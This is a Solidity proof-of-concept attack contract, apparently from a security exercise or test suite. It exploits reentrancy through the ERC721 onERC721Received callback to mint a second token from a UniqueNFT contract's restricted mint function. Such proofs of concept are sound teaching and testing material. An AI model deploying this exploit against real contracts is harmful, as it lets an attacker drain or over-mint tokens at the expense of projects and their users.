// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {UniqueNFT} from "./UniqueNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract UniqueNFTAttack is IERC721Receiver {
    uint8 callCount;

    event UniqueNFTAttack__ERC721Received(uint256 indexed tokenId, uint8 indexed callCount, bytes data);

    constructor() {}

    function attack(address target) external {
        UniqueNFT(target).mintNFTEOA();
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        callCount += 1;
        emit UniqueNFTAttack__ERC721Received(tokenId, callCount, data);

        if (callCount == 1) {
            UniqueNFT(msg.sender).mintNFTEOA();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
